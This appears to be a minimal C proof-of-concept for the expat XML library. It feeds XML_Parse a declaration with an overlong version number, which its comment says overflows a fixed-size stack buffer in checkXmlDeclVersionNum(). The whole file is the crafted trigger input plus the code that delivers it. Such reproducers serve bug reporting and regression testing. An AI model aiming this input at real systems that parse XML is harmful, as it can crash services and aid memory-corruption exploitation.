/* PoC: XML declaration with an overlong version number overflows the
 * fixed-size stack buffer used by checkXmlDeclVersionNum() in
 * lib/xmltok.c, via the public XML_Parse entry point. */
#include <expat.h>
#include <stdio.h>
#include <string.h>

int
main(void) {
  char doc[256];
  snprintf(doc, sizeof(doc),
           "<?xml version='1.%s'?>\n<doc/>",
           "123456789012345678901234567890");

  XML_Parser parser = XML_ParserCreate(NULL);
  enum XML_Status status
      = XML_Parse(parser, doc, (int)strlen(doc), XML_TRUE);
  printf("status=%d\n", status);
  XML_ParserFree(parser);
  return 0;
}
